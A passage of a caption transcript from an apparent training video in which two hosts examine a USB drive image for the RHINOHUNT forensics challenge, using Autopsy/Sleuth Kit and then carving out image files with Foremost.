00:02:14.011\ncontext, where it's something you\nmight actually be looking for.\n\n51\n00:02:14.011 --> 00:02:15.281\n&gt;&gt; Yeah, without going too far and\n\n52\n00:02:15.281 --> 00:02:19.408\nmaking it something you didn't want to.\n&gt;&gt; Exactly, see, we all get it.\n\n53\n00:02:19.408 --> 00:02:20.469\n&gt;&gt; Yeah, I like it, I like it.\n\n54\n00:02:20.469 --> 00:02:21.045\n&gt;&gt; Yeah, we're adults here,\n\n55\n00:02:21.045 --> 00:02:22.459\nwe can work around the problem, right?\n&gt;&gt; All right, so\n\n56\n00:02:22.459 --> 00:02:24.931\nwe've got this image of our\nthumb drive that we've taken,\n\n57\n00:02:24.931 --> 00:02:27.159\nwe've imported that into our autopsy.\n&gt;&gt; Exactly,\n\n58\n00:02:27.159 --> 00:02:29.871\nnow we're gonna open the case file,\ngo back into it.\n\n59\n00:02:29.871 --> 00:02:33.591\nAnd we're gonna start looking at the data,\nwe start looking for things.\n\n60\n00:02:33.591 --> 00:02:36.129\nRemember, we're looking for images and\n\n61\n00:02:36.129 --> 00:02:41.500\ninformation that we've been instructed\nto gather from the challenge itself.\n\n62\n00:02:41.500 --> 00:02:43.870\nSo let's go ahead and\njump back in my computer.\n\n63\n00:02:43.870 --> 00:02:48.002\nI've got the Sleuth Kit just opened\nup right here to, here's your\n\n64\n00:02:48.002 --> 00:02:53.210\nlocalhost.9999, that's the port,\nand then it's autopsy, right?\n\n65\n00:02:53.210 --> 00:02:58.282\nSo this is basically the landing page for\nautopsy of the Sleuth Kit here in Linux.\n\n66\n00:02:58.282 --> 00:03:03.379\nI'm gonna hit Open Case, and that takes\nme to my case gallery, that's very cool.\n\n67\n00:03:03.379 --> 00:03:06.934\nSo the cases that I've been working on,\nI'm now able to pick\n\n68\n00:03:06.934 --> 00:03:10.680\nthe one that I need so\nthat I can go in and look at more details.\n\n69\n00:03:10.680 --> 00:03:14.500\nSo maybe if I'm working on multiple cases,\nor if Mike and I are two different\n\n70\n00:03:14.500 --> 00:03:17.910\nforensics investigators,\nhe has access to the same portal.\n\n71\n00:03:17.910 --> 00:03:21.064\nHe can check his case, I can check\nmy mine, and everybody's happy.\n\n72\n00:03:21.064 --> 00:03:22.098\n&gt;&gt; One of the great things,\n\n73\n00:03:22.098 --> 00:03:23.970\nI know we've talked\na little bit about this,\n\n74\n00:03:23.970 --> 00:03:25.046\nabout these kits.\n&gt;&gt; Yeah.\n\n75\n00:03:25.046 --> 00:03:26.841\n&gt;&gt; Where we can probably go out and\n\n76\n00:03:26.841 --> 00:03:30.916\nfind individual tools that'll allow\nus to accomplish very similar,\n\n77\n00:03:30.916 --> 00:03:32.310\nif not the same things.\n\n78\n00:03:32.310 --> 00:03:34.540\nBut this is a way to\nkeep it all organized.\n\n79\n00:03:34.540 --> 00:03:39.500\nAnd for somebody like me, I mean that's\na huge plus, one place to go to find\n\n80\n00:03:39.500 --> 00:03:41.444\nall the stuff I've been working on.\n&gt;&gt; Totally agree,\n\n81\n00:03:41.444 --> 00:03:43.487\nI like where Mike's head is at on this.\n\n82\n00:03:43.487 --> 00:03:47.553\nAnd this is typically why,\nwhen you do this for a living,\n\n83\n00:03:47.553 --> 00:03:50.710\nthis is your job,\nyou will spend the money.\n\n84\n00:03:50.710 --> 00:03:55.077\nYou'll throw the money on the barrel\nhead for an FTK for an end case,\n\n85\n00:03:55.077 --> 00:03:58.228\nbecause of their wide\nvariety of capabilities.\n\n86\n00:03:58.228 --> 00:04:03.350\nNot only that, but the quality in\nwhich they do those things, right?\n\n87\n00:04:03.350 --> 00:04:06.410\nWe're here,\nwe're not professional sleuth units,\n\n88\n00:04:06.410 --> 00:04:09.390\nso we're employing the more\nopen source stuff.\n\n89\n00:04:09.390 --> 00:04:12.789\nMaybe we're just a couple security guys\nthat work for a company, and every now and\n\n90\n00:04:12.789 --> 00:04:15.906\nthen we have a incident that we would\nlike to investigate a little farther.\n\n91\n00:04:15.906 --> 00:04:18.317\nSo now we're employing some of\nthe techniques that we know,\n\n92\n00:04:18.317 --> 00:04:19.510\ncould be either those cases.\n\n93\n00:04:19.510 --> 00:04:22.682\nAnd this is why we're using Sleuth Kit,\nplus I think that for the show and\n\n94\n00:04:22.682 --> 00:04:24.312\nthe demonstration purposes.\n&gt;&gt; [LAUGH]\n\n95\n00:04:24.312 --> 00:04:25.820\n&gt;&gt; It might be a little overkill to buy\n\n96\n00:04:25.820 --> 00:04:28.056\nan end case [LAUGH].\n&gt;&gt; We tried to convince Don for\n\n97\n00:04:28.056 --> 00:04:30.805\na license, but no, wasn't happening.\n&gt;&gt; [LAUGH] Yeah, maybe one day,\n\n98\n00:04:30.805 --> 00:04:31.507\nmaybe one day.\n&gt;&gt; Yeah [LAUGH].\n\n99\n00:04:31.507 --> 00:04:32.031\n&gt;&gt; There we go.\n\n100\n00:04:32.031 --> 00:04:36.273\nAll right, so now that we've our\ncase gallery I'm gonna choose ours,\n\n101\n00:04:36.273 --> 00:04:41.170\nwhich is RHINOHUNT, make sure that I\nclick on that and then click details.\n\n102\n00:04:41.170 --> 00:04:45.758\nSo now I get some more of the details\non here, the name is the RHINOHUNT,\n\n103\n00:04:45.758 --> 00:04:49.525\nthe description,\nUniversity of New Orleans rhino case.\n\n104\n00:04:49.525 --> 00:04:51.426\nWhen it was created,\ndate and time there, so\n\n105\n00:04:51.426 --> 00:04:53.538\nI make sure that I'm working\nwith the right file.\n\n106\n00:04:53.538 --> 00:04:56.758\nYou don't want to mess with the wrong\nfile and start modifying things.\n\n107\n00:04:56.758 --> 00:04:58.510\nThat could be bad, right?\n\n108\n00:04:58.510 --> 00:05:01.284\nSo we wanna keep things going\nto verify those things, right?\n\n109\n00:05:01.284 --> 00:05:08.899\nClick OK and if I click details,\ncome on now.\n\n110\n00:05:08.899 --> 00:05:11.908\nThere we go, click that and\nthen click OK, there we go [LAUGH].\n\n111\n00:05:11.908 --> 00:05:12.878\n&gt;&gt; [LAUGH]\n\n112\n00:05:12.878 --> 00:05:14.230\n&gt;&gt; So these details are there,\n\n113\n00:05:14.230 --> 00:05:17.820\nit's just a little brain maneuver there.\n\n114\n00:05:17.820 --> 00:05:21.725\nAll right, so now we can look at\nthe details of the actual host that we've\n\n115\n00:05:21.725 --> 00:05:24.043\nimported, make sure it's the right one.\n\n116\n00:05:24.043 --> 00:05:25.680\nName is right, RHINOUSB,\n\n117\n00:05:25.680 --> 00:05:29.664\nif we were to put any description\nthere to let us know what that was,\n\n118\n00:05:29.664 --> 00:05:34.172\nmaybe the time zone as well, if we had\nthe hashes that we wanted to include.\n\n119\n00:05:34.172 --> 00:05:38.815\nThere we go and there's the directory to\nwhere it actually resides on the system.\n\n120\n00:05:38.815 --> 00:05:42.703\nWe'll click OK, we'll go back,\nwe got that one and we'll hit OK.\n\n121\n00:05:42.703 --> 00:05:48.984\nSo now we're back to where we were when\nwe left you guys with our cliffhanger and\n\n122\n00:05:48.984 --> 00:05:54.060\nwe can start actually analyzing\nthis drive image, okay?\n\n123\n00:05:54.060 --> 00:05:56.810\nAgain, you probably wanna hit that details\njust to make sure you're working with\n\n124\n00:05:56.810 --> 00:05:57.830\nthe right thing.\n\n125\n00:05:57.830 --> 00:06:02.110\nThere might be multiple volumes in here,\nmultiple images, so check that out.\n\n126\n00:06:02.110 --> 00:06:04.102\nVolume ID, volume one, image one.\n\n127\n00:06:04.102 --> 00:06:05.780\nIt's in the raw format, sweet.\n\n128\n00:06:05.780 --> 00:06:12.432\nFile type FFAT-16, and that is the correct\nnaming convention, so looks good to me.\n\n129\n00:06:12.432 --> 00:06:14.038\nEverything here looks fine,\n\n130\n00:06:14.038 --> 00:06:17.968\nremember does not include slack space,\nthat's an interesting thing.\n\n131\n00:06:17.968 --> 00:06:20.960\nWe're gonna talk about that here in\njust a moment, to be honest with you.\n\n132\n00:06:20.960 --> 00:06:24.644\nAnd we generated MD5,\nwe can extract on an allocated, but\n\n133\n00:06:24.644 --> 00:06:27.458\nwe're just gonna start\nwith the bare bones.\n\n134\n00:06:27.458 --> 00:06:32.080\nWe're gonna go back here, we're gonna\nclose this, go here hit analyze.\n\n135\n00:06:32.080 --> 00:06:33.660\nAll right,\nstarting to analyze this volume.\n\n136\n00:06:33.660 --> 00:06:38.150\nChoose an analysis mode from the tabs\nabove, you've got multiple choices here.\n\n137\n00:06:38.150 --> 00:06:43.144\nFile analysis, keyword search, file type,\nimage details, metadata, and data unit.\n\n138\n00:06:43.144 --> 00:06:45.992\nYou don't need to be 100%\nfamiliar with all these things,\n\n139\n00:06:45.992 --> 00:06:48.280\nthis is the basic idea here for the demo.\n\n140\n00:06:48.280 --> 00:06:52.100\nBut you will wanna play with this, and\nwe'll probably touch on most of these,\n\n141\n00:06:52.100 --> 00:06:52.940\nif not all.\n\n142\n00:06:52.940 --> 00:06:57.970\nBut let's get directly into file analysis,\nthat's where we wanna start.\n\n143\n00:06:57.970 --> 00:06:59.630\nSo I'm gonna click file analysis,\n\n144\n00:06:59.630 --> 00:07:03.680\nand you'll start to see we've already\ngotten some information coming out here.\n\n145\n00:07:03.680 --> 00:07:08.240\nWe got some FAT information,\nthat's just a file allocation table,\n\n146\n00:07:08.240 --> 00:07:12.160\nthe file system that's used,\nand the drive itself.\n\n147\n00:07:12.160 --> 00:07:13.720\nWe got the master boot records, so\n\n148\n00:07:13.720 --> 00:07:16.380\nmaybe there's information\nthere that we need to know.\n\n149\n00:07:16.380 --> 00:07:22.110\nWe also have orphaned files, these are\nfiles that just got either overwritten or\n\n150\n00:07:22.110 --> 00:07:24.170\nlost their iNodes test, who knows.\n\n151\n00:07:24.170 --> 00:07:27.540\nThey're just wandering around,\nI'm gonna make sure to get those as well.\n\n152\n00:07:27.540 --> 00:07:30.920\nSo we can click on any of these,\nwe can click on FAT one and\n\n153\n00:07:30.920 --> 00:07:35.210\nit starts showing us\nthe contents of file c, FAT one.\n\n154\n00:07:35.210 --> 00:07:39.930\nWhich is just a bunch of ASCII characters,\nthat's what it looks like here.\n\n155\n00:07:39.930 --> 00:07:43.578\nAnd you definitely wanna make sure\nthat any sliders that are there,\n\n156\n00:07:43.578 --> 00:07:44.734\nthat you slide them.\n\n157\n00:07:44.734 --> 00:07:46.183\nIf they go up or down, go up and down.\n\n158\n00:07:46.183 --> 00:07:47.503\nIf they go left and\nright, go left and right.\n\n159\n00:07:47.503 --> 00:07:49.910\nLook at this stuff,\neven though it seems like,\n\n160\n00:07:49.910 --> 00:07:53.535\neh, it doesn't look like a lot of\ninformation going on there, right?\n\n161\n00:07:53.535 --> 00:07:57.275\nBut you never know, it's the little\ndetails that will help you get to\n\n162\n00:07:57.275 --> 00:08:00.305\nthe finish line, right?\n&gt;&gt; Uh-huh, so don't assume that that\n\n163\n00:08:00.305 --> 00:08:03.241\nstring goes on There's something\nhidden at the end of that string,\n\n164\n00:08:03.241 --> 00:08:05.285\na nice little jewel sitting there.\n&gt;&gt; Exactly,\n\n165\n00:08:05.285 --> 00:08:08.040\nyou hate to have overlooked it because,\nguess what?\n\n166\n00:08:08.040 --> 00:08:08.840\nDone it.\n\n167\n00:08:08.840 --> 00:08:10.790\nCompletely done that, and it's so\n\n168\n00:08:10.790 --> 00:08:13.740\nirritating because then you feel like,\nI'm better than that.\n\n169\n00:08:13.740 --> 00:08:15.400\nI can't believe I did that.\n\n170\n00:08:15.400 --> 00:08:16.310\nAnd it's very frustrating.\n\n171\n00:08:16.310 --> 00:08:18.490\nSo don't be that person.\n\n172\n00:08:18.490 --> 00:08:20.570\nMake sure that you look at\nall the data that's provided.\n\n173\n00:08:20.570 --> 00:08:22.920\nAnd we can just look through,\njust click all the links they give you.\n\n174\n00:08:22.920 --> 00:08:28.040\nIt looks like we got basically the same\nthing on the FAT2, which we did.\n\n175\n00:08:28.040 --> 00:08:30.460\nI slid it all the way over,\nthere's no up and down.\n\n176\n00:08:30.460 --> 00:08:33.370\nLook at the NBR.\nHere's some interesting stuff.\n\n177\n00:08:33.370 --> 00:08:36.869\nFAT16, this is not a bootable disk,\nplease insert a bootable floppy.\n\n178\n00:08:36.869 --> 00:08:41.080\nSo looks like it's gathering\nsome information that was dumped\n\n179\n00:08:41.080 --> 00:08:44.100\nfrom the master boot\nrecord at the boot time,\n\n180\n00:08:44.100 --> 00:08:47.046\nthis is the last file that it wrote,\nright?\n\n181\n00:08:47.046 --> 00:08:49.945\nSo I'm gonna press [INAUDIBLE] try again.\n\n182\n00:08:49.945 --> 00:08:51.990\nLet's look at orphaned files.\n\n183\n00:08:51.990 --> 00:08:54.830\nDoesn't look like a whole lot in there.\n\n184\n00:08:54.830 --> 00:08:58.010\nNow there's no content, actually.\n\n185\n00:08:58.010 --> 00:08:59.280\nSo there we go.\n\n186\n00:08:59.280 --> 00:09:02.210\nLet's go look at file type.\n\n187\n00:09:02.210 --> 00:09:05.010\nFile sorting, I can sort files by type.\n\n188\n00:09:05.010 --> 00:09:07.890\nIt looks like I can actually grab that,\nthere we go,\n\n189\n00:09:07.890 --> 00:09:12.460\nthe sorters are located here,\nlet's see what this does.\n\n190\n00:09:12.460 --> 00:09:15.459\nThat's analysising, it's done 100%.\n\n191\n00:09:15.459 --> 00:09:17.330\nThere we go, it's found some.\n\n192\n00:09:17.330 --> 00:09:19.400\nThere's the image, found six files,\n\n193\n00:09:19.400 --> 00:09:23.165\nskipped four as they were\napparently non-files.\n\n194\n00:09:23.165 --> 00:09:25.520\nRe-allocated, you're starting to get some\n\n195\n00:09:25.520 --> 00:09:29.310\nidea of what kind of\ninformation is on the system.\n\n196\n00:09:29.310 --> 00:09:34.290\nI like how this categorizes things for\nyou so that you can see these things.\n\n197\n00:09:34.290 --> 00:09:37.960\nThere is no archive, audio,\ncompressed or anything but\n\n198\n00:09:37.960 --> 00:09:40.951\nwe do have a couple of\nfiles in here somewhere.\n\n199\n00:09:40.951 --> 00:09:42.572\nThey look to be text files,\n\n200\n00:09:42.572 --> 00:09:45.927\nI can't, here we go, text files.\n&gt;&gt; Now is this still analyzing in\n\n201\n00:09:45.927 --> 00:09:47.520\nthe background, or is it done?\n&gt;&gt; Yeah,\n\n202\n00:09:47.520 --> 00:09:48.300\nwe're done.\n&gt;&gt; Okay.\n\n203\n00:09:48.300 --> 00:09:50.380\n&gt;&gt; Yeah, once it gives you some output,\n\n204\n00:09:50.380 --> 00:09:51.060\nit is done.\n\n205\n00:09:51.060 --> 00:09:55.060\nIt'll analyze until it's done,\nthen spit the output back at you.\n\n206\n00:09:55.060 --> 00:09:58.610\nSo we know we've got two text\nfiles in the system so far.\n\n207\n00:09:58.610 --> 00:10:02.420\nLet's view sorted files.\n\n208\n00:10:02.420 --> 00:10:03.370\nFile type sorting.\n\n209\n00:10:03.370 --> 00:10:06.690\nIt doesn't look to be\nanything interesting there.\n\n210\n00:10:06.690 --> 00:10:08.510\nLet's go to image details.\n\n211\n00:10:08.510 --> 00:10:10.970\nSee what we can see there.\n\n212\n00:10:11.970 --> 00:10:13.460\nFAT contents.\n\n213\n00:10:13.460 --> 00:10:14.360\nClick on that link.\n\n214\n00:10:15.820 --> 00:10:16.600\nInteresting.\n\n215\n00:10:16.600 --> 00:10:19.380\nWe got ourselves a gumbo recipe.\n\n216\n00:10:20.460 --> 00:10:26.890\nSo this was something, this was a file\nthat it found on the system itself, okay?\n\n217\n00:10:26.890 --> 00:10:27.760\nVery, very interesting.\n\n218\n00:10:27.760 --> 00:10:31.980\nIt gives you some sector numbers,\nthe number of sectors, sector size,\n\n219\n00:10:31.980 --> 00:10:38.010\naddress type, and\nthis looks to be just a recipe for gumbo.\n\n220\n00:10:38.010 --> 00:10:42.540\nAnd then it has this string of text\nthat says SORRY about a zillion times,\n\n221\n00:10:42.540 --> 00:10:43.960\nall the way to the end,\nexcept for the last y.\n\n222\n00:10:43.960 --> 00:10:45.120\nSomeone got lazy, I guess,\n\n223\n00:10:45.120 --> 00:10:48.820\nI don't know why they were writing\nSORRY a million times, but there it is.\n\n224\n00:10:48.820 --> 00:10:49.960\nSORRY.\n\n225\n00:10:49.960 --> 00:10:53.870\nDoesn't seem to be, of course,\nyou would read this text looking for\n\n226\n00:10:53.870 --> 00:11:00.000\nany critical information that might\nbe pertinent to the case in hand.\n\n227\n00:11:00.000 --> 00:11:04.910\nBut here we just have what\nseems to be a gumbo recipe.\n\n228\n00:11:04.910 --> 00:11:05.970\nLet's go to the next one.\n\n229\n00:11:07.810 --> 00:11:11.840\nLet's see here, in the next one I believe,\ndid I click it?\n\n230\n00:11:11.840 --> 00:11:13.540\nNext, there we go.\n\n231\n00:11:13.540 --> 00:11:18.080\nASCII contents, it looks to be yet\nanother gumbo recipe.\n\n232\n00:11:18.080 --> 00:11:20.795\nAnd then it's a bunch of SORRYs yet again.\n\n233\n00:11:20.795 --> 00:11:25.308\nScrolling all the way down,\nthere's more stuff at the end,\n\n234\n00:11:25.308 --> 00:11:30.014\nshrimp and andouille sausage,\nI guess it's how you say that.\n\n235\n00:11:30.014 --> 00:11:31.645\nMore gumba stuff.\n&gt;&gt; Andouille.\n\n236\n00:11:31.645 --> 00:11:32.361\n&gt;&gt; Yeah, I don't\n\n237\n00:11:32.361 --> 00:11:33.564\nspeak French.\n&gt;&gt; [LAUGH]\n\n238\n00:11:33.564 --> 00:11:35.959\n&gt;&gt; I'll go with my Mike's assertation on\n\n239\n00:11:35.959 --> 00:11:37.490\nhow to say these things.\n\n240\n00:11:38.830 --> 00:11:42.540\nSo we found two text files,\nthat's interesting.\n\n241\n00:11:42.540 --> 00:11:45.380\nBut let's click Metadata,\nmaybe there's some metadata in there.\n\n242\n00:11:45.380 --> 00:11:49.180\nMetadata, you remember,\nthis is the content creator,\n\n243\n00:11:49.180 --> 00:11:53.410\nfile type, when it was created,\nwhen it was last modified.\n\n244\n00:11:53.410 --> 00:11:59.000\nThat kind of data sits around\non the back side of these files.\n\n245\n00:11:59.000 --> 00:12:02.652\nIt's in there, it's created\nusually by the operating system.\n\n246\n00:12:02.652 --> 00:12:05.300\nI was saying, data about the data.\n&gt;&gt; Yeah.\n\n247\n00:12:05.300 --> 00:12:07.886\nI like that, data about the data.\n&gt;&gt; Yeah.\n\n248\n00:12:07.886 --> 00:12:09.462\n&gt;&gt; Meta meaning above,\n\n249\n00:12:09.462 --> 00:12:10.779\naround the data.\n\n250\n00:12:10.779 --> 00:12:12.138\n&gt;&gt; [LAUGH]\n&gt;&gt; There you go.\n\n251\n00:12:12.138 --> 00:12:15.778\nSo here we can view any data,\nI don't have a data,\n\n252\n00:12:15.778 --> 00:12:18.564\nlet's look at this allocation list.\n\n253\n00:12:18.564 --> 00:12:21.590\nTo allocated, and there we go.\n\n254\n00:12:21.590 --> 00:12:24.042\nAnd we go to MD5, the content, so\n\n255\n00:12:24.042 --> 00:12:29.285\nif we want to verify that the integrity\nis still good, I can see that MD5,\n\n256\n00:12:29.285 --> 00:12:35.310\nrun an MD5 on the original and make sure\nthat that's all, I can also do the SHA-1.\n\n257\n00:12:35.310 --> 00:12:37.000\nWe've got some sectors in here.\n\n258\n00:12:37.000 --> 00:12:38.251\nWe can go into that.\n\n259\n00:12:38.251 --> 00:12:41.228\nWe can see that this gumbo.txt and\ngumbo2.txt.\n\n260\n00:12:41.228 --> 00:12:46.690\nSo getting that information, that metadata\nabout it, very interesting stuff.\n\n261\n00:12:46.690 --> 00:12:49.620\nBut we're not seeing anything too crazy,\nso\n\n262\n00:12:49.620 --> 00:12:52.200\nmaybe there's more to it than that, right?\n\n263\n00:12:52.200 --> 00:12:56.630\nLet's go back to, well let's do data unit.\n\n264\n00:12:56.630 --> 00:12:59.410\nHit location list,\n\n265\n00:12:59.410 --> 00:13:04.440\nI think basically if I wanted\nto use contents of sector 15.\n\n266\n00:13:04.440 --> 00:13:07.540\nSo it's showing us the sector breakdown.\n\n267\n00:13:07.540 --> 00:13:10.950\nAnd let's see, find metadata address.\n\n268\n00:13:12.140 --> 00:13:15.940\nThere's the pointed to by dir entry this.\n\n269\n00:13:15.940 --> 00:13:20.616\nThat information might be important\nto verify that this is as good as\n\n270\n00:13:20.616 --> 00:13:26.044\nthe original, or that there was no\ntampering, things of that nature, okay?\n\n271\n00:13:26.044 --> 00:13:27.260\nSo [COUGH] I'm looking around for that.\n\n272\n00:13:27.260 --> 00:13:31.646\nAgain, this is a lot of poking around,\nlooking at files,\n\n273\n00:13:31.646 --> 00:13:36.225\nyou're searching for clues and\ncan that be a little boring?\n\n274\n00:13:36.225 --> 00:13:39.302\nProbably in some cases.\n&gt;&gt; [LAUGH]\n\n275\n00:13:39.302 --> 00:13:40.759\n&gt;&gt; But it is an important step in\n\n276\n00:13:40.759 --> 00:13:42.350\nthe forensic investigation.\n\n277\n00:13:42.350 --> 00:13:46.240\nOf course, you kind of have to go through\nthese things with a fine tooth comb.\n\n278\n00:13:46.240 --> 00:13:48.500\nLooking at the data, just clicking links.\n\n279\n00:13:48.500 --> 00:13:50.580\nFollowing, reading and\n\n280\n00:13:50.580 --> 00:13:54.200\nstaring through something until you find,\nwhat's that, right?\n\n281\n00:13:55.280 --> 00:13:58.810\nBut this is a very basic\nlook at this file system.\n\n282\n00:13:58.810 --> 00:14:02.602\nWe're just looking at what the contents\nwere where we found the two gumbo.text\n\n283\n00:14:02.602 --> 00:14:04.460\nfiles gumbo1 and gumbo2.\n\n284\n00:14:04.460 --> 00:14:05.990\nInteresting, there were\nsome gumbo recipes,\n\n285\n00:14:05.990 --> 00:14:09.450\nthat weird text data that said sorry.\n&gt;&gt; Mm-hm.\n\n286\n00:14:09.450 --> 00:14:14.000\n&gt;&gt; Okay, weird, let's head back,\n\n287\n00:14:14.000 --> 00:14:20.430\nclose this, and\nlet's look at the details again.\n\n288\n00:14:20.430 --> 00:14:22.440\nI wanna hit extract and allocate it.\n\n289\n00:14:23.590 --> 00:14:24.268\nSee what it does.\n\n290\n00:14:24.268 --> 00:14:29.577\nExtracting unallocated data, configuration\nupdated, calculated MD5 value.\n\n291\n00:14:29.577 --> 00:14:33.058\nThe image details here.\n\n292\n00:14:33.058 --> 00:14:35.980\nLooks like it didn't\nshow me anything more, so\n\n293\n00:14:35.980 --> 00:14:39.930\nmaybe it was unable to\nreally show me much more.\n\n294\n00:14:41.370 --> 00:14:44.856\nLet's extract strings.\n\n295\n00:14:44.856 --> 00:14:45.960\nGo to image details.\n\n296\n00:14:45.960 --> 00:14:49.401\nLet's go back to that link.\n\n297\n00:14:49.401 --> 00:14:51.143\nYou can do a keyword search,\n\n298\n00:14:51.143 --> 00:14:55.290\nI guess, looking for anything if\nyou thought there was something.\n\n299\n00:14:55.290 --> 00:14:59.470\nSo look for the term rhino and\nsee if that finds anything.\n\n300\n00:15:01.320 --> 00:15:02.940\nAnd nothing comes up.\n\n301\n00:15:02.940 --> 00:15:08.110\nWell, we gotta employ some more\ninteresting means of evaluating this data.\n\n302\n00:15:08.110 --> 00:15:12.240\nSo we've done a very straightforward look,\nlet's just open the file or\n\n303\n00:15:12.240 --> 00:15:14.300\nthe disk image itself,\nstart taking a look.\n\n304\n00:15:14.300 --> 00:15:16.450\nMaybe something is there,\nmaybe something is not.\n\n305\n00:15:16.450 --> 00:15:19.490\nSo far we're not seeing\nanything that's glaring,\n\n306\n00:15:19.490 --> 00:15:24.298\nnothing that's shouting to us, hey,\nhere's a picture of a rhinoceros, right?\n\n307\n00:15:24.298 --> 00:15:30.330\nSo maybe they're hidden because we know,\nobviously this is a challenge,\n\n308\n00:15:30.330 --> 00:15:33.300\nthere must be some rhinoceros\npictures in here somewhere.\n\n309\n00:15:33.300 --> 00:15:35.125\nSo maybe we've gotta\ndig a little deeper and\n\n310\n00:15:35.125 --> 00:15:39.150\nemploy some different\nmethodologies to find that data.\n\n311\n00:15:39.150 --> 00:15:41.790\nBecause on the surface,\nputting it in our disc analyzer,\n\n312\n00:15:41.790 --> 00:15:47.050\nnever really found a whole lot, so we're\ngonna have to take it a step further.\n\n313\n00:15:47.050 --> 00:15:50.834\nAnd one step we can do\nis there's a method or\n\n314\n00:15:50.834 --> 00:15:55.787\na practice known as a disc carve or\na file carve, right?\n\n315\n00:15:55.787 --> 00:16:02.317\nFile carving is basically, you can hide\ndata within inside other data Okay,\n\n316\n00:16:02.317 --> 00:16:07.441\nso what we need to do,\nwe need to use tools to find that data and\n\n317\n00:16:07.441 --> 00:16:10.070\ncarve that, separate it out.\n\n318\n00:16:10.070 --> 00:16:13.170\nAnd so\nthat we can see it in its raw format.\n\n319\n00:16:13.170 --> 00:16:15.537\nSo that's what we need to\ndo I think with this one.\n\n320\n00:16:15.537 --> 00:16:17.604\nWhen I say I think, I know.\n&gt;&gt; [LAUGH]\n\n321\n00:16:17.604 --> 00:16:19.840\n&gt;&gt; Cuz I actually did this challenege, so\n\n322\n00:16:19.840 --> 00:16:21.749\nwe'll be able to work with that.\n\n323\n00:16:21.749 --> 00:16:22.918\nSo that's what I wanna do.\n\n324\n00:16:22.918 --> 00:16:24.300\nI wanna do some file carving and\n\n325\n00:16:24.300 --> 00:16:28.086\nsee if there's any images we can carve out\nbecause that's what we're looking for.\n\n326\n00:16:28.086 --> 00:16:31.619\nImages of rhinoceros and\nany information that we\n\n327\n00:16:31.619 --> 00:16:36.090\nmight find otherwise as far\nas clues to the case itself.\n\n328\n00:16:36.090 --> 00:16:37.000\nWho was the perpetrator?\n\n329\n00:16:37.000 --> 00:16:39.600\nWhat has happened to some of\nthe objects that we're looking for?\n\n330\n00:16:39.600 --> 00:16:41.420\nThings of that nature,\nwho gave them access?\n\n331\n00:16:41.420 --> 00:16:42.580\nWhat did they use?\n\n332\n00:16:42.580 --> 00:16:45.660\nAnd all that, so\nwe're going to do some file carving.\n\n333\n00:16:45.660 --> 00:16:46.245\nIt's gonna be fun.\n\n334\n00:16:46.245 --> 00:16:50.377\nWe're gonna use a couple of tools that\nare inside of Linux that you could use and\n\n335\n00:16:50.377 --> 00:16:51.700\nvery, very handy.\n\n336\n00:16:51.700 --> 00:16:55.530\nFirst one I recommend is\nForemost built into Kali, so\n\n337\n00:16:55.530 --> 00:16:57.060\nif you've got Kali you've\nalready got Foremost.\n\n338\n00:16:57.060 --> 00:17:00.784\nOtherwise, you have to install it if\nyour distribution does not have it\n\n339\n00:17:00.784 --> 00:17:03.130\npre-installed, prebaked.\n\n340\n00:17:03.130 --> 00:17:04.671\nSo let's do that.\n\n341\n00:17:04.671 --> 00:17:07.550\nI'm gonna push this down, let me do that.\n\n342\n00:17:07.550 --> 00:17:09.501\nMove this to one workspace down.\n\n343\n00:17:09.501 --> 00:17:14.366\nThere we go, we've got ourselves\na lovely terminal up, ready to go.\n\n344\n00:17:14.366 --> 00:17:21.834\nI'm going to RHINO2, I believe, yes, there\nwe are, so now we have our RHINOUSB.dd.\n\n345\n00:17:21.834 --> 00:17:27.000\nI'm going to see if we can't carve\nanything, any data out of this image.\n\n346\n00:17:27.000 --> 00:17:27.964\nSo here's what we're gonna do.\n\n347\n00:17:27.964 --> 00:17:31.284\nWe're gonna use Foremost, like so.\n\n348\n00:17:31.284 --> 00:17:35.640\nAnd you're gonna do -t, which is\nwhat types of data am I looking for.\n\n349\n00:17:35.640 --> 00:17:39.510\nAnd then you give it a comma separated\nlist of those types of data.\n\n350\n00:17:39.510 --> 00:17:44.550\nI'll look for doc files, let's go jpeg,\n\n351\n00:17:44.550 --> 00:17:48.471\nlet's do pngs, let's do gifs.\n\n352\n00:17:48.471 --> 00:17:50.883\nLet's do how about pdfs?\n\n353\n00:17:50.883 --> 00:17:52.500\nYou never know,\nthere's images in pdfs sometimes.\n\n354\n00:17:52.500 --> 00:17:56.900\nPdf and maybe even with the xls.\n\n355\n00:17:56.900 --> 00:17:57.680\nYou never know.\n\n356\n00:17:57.680 --> 00:17:59.215\nSomeone maybe threw\nsomething in a spreadsheet.\n\n357\n00:17:59.215 --> 00:18:00.666\nThis is how you gotta think.\n\n358\n00:18:00.666 --> 00:18:04.702\nYou gotta have that list of files that\nyou commonly would think of when it comes\n\n359\n00:18:04.702 --> 00:18:07.460\nto where you might slap\nan image somewhere, right?\n\n360\n00:18:07.460 --> 00:18:09.760\nOr just interesting data, right?\n\n361\n00:18:09.760 --> 00:18:12.223\nThere we go, common files.\n\n362\n00:18:12.223 --> 00:18:15.053\nGive a -i for\nwhere is basically my source,\n\n363\n00:18:15.053 --> 00:18:17.666\nwhere is the image that I'm feeding it.\n\n364\n00:18:17.666 --> 00:18:21.504\nAnd that is in /root/\n\n365\n00:18:21.504 --> 00:18:28.375\nRhino2/rhinusb.dd and hit Return.\n\n366\n00:18:28.375 --> 00:18:30.879\nIt's processing, here we go, already done.\n\n367\n00:18:30.879 --> 00:18:32.970\nIt's a small file, so\nit didn't take very long.\n\n368\n00:18:32.970 --> 00:18:36.540\nWe're in LS and\nnow we've got this output folder,\n\n369\n00:18:38.590 --> 00:18:43.020\nthat's Foremost output,\nwe will cd into the output file.\n\n370\n00:18:43.020 --> 00:18:44.620\nDo an ls.\n\n371\n00:18:44.620 --> 00:18:49.270\nLooks like it has a gif and\na jpg folder has been created, so\n\n372\n00:18:49.270 --> 00:18:54.210\nmaybe it's found gifs and/or jpgs,\nwhich I would assume it has.\n\n373\n00:18:54.210 --> 00:18:55.860\nSo let's start with jpgs.\n\n374\n00:18:55.860 --> 00:18:59.015\nSo jpg and, hey, look at that.\n\n375\n00:18:59.015 --> 00:19:01.410\nWe have found some files.\n&gt;&gt; Wow.\n\n376\n00:19:01.410 --> 00:19:02.330\n&gt;&gt; So that's interesting stuff.\n\n377\n00:19:02.330 --> 00:19:06.770\nLet's go back and see what's in gif, or\njif, or however you say it, that's cd gif.\n\n378\n00:19:06.770 --> 00:19:11.880\nAnd we've got two gifs there, interesting.\n\n379\n00:19:11.880 --> 00:19:17.500\nLet's back up one more time 